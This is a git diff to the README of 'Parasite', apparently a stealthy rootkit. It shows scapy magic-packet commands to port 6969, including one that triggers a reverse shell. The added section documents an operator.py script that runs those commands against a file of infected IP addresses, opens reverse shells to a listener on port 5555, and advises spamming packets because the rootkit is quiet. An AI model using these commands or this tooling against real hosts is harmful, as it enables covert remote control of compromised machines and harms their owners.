@@ -66,6 +66,19 @@ sr1(IP(dst="INSERT_IP")/TCP(dport=6969)/Raw(load='PARASITE_SHOW'))
 sr1(IP(dst="INSERT_IP")/TCP(dport=6969)/Raw(load='PARASITE_RSHELL127.0.0.1))
 ```
 
+### operator.py script
+
+The *operator.py* script is intuitively simple as it automates all of the scapy commands (scapy must be pip-installed). Simply modify the *scope.txt* file to include the list of IP's you've infected, and then run the python file via the following:
+```
+python3 operator.py scope.txt
+```
+
+Some things to take note of:
+- Run *help* within the script to get a list of available commands
+- The reload/ls command has some flaws due to the designed nature of it; the rootkit can still be present on the box and return a red state. 
+- To spawn a reverse shell, you must have a second terminal open and listening to the port (default: 5555)
+- Lastly, since the rootkit is extremely quiet, you may have to spam the packet functionality a little, as packets can be dropped, intercepted, etc. 
+
 ## Uninstallation
 To disable Parasite from running on the host, you can remove it *assuming it isn't hidden*
 ```sh
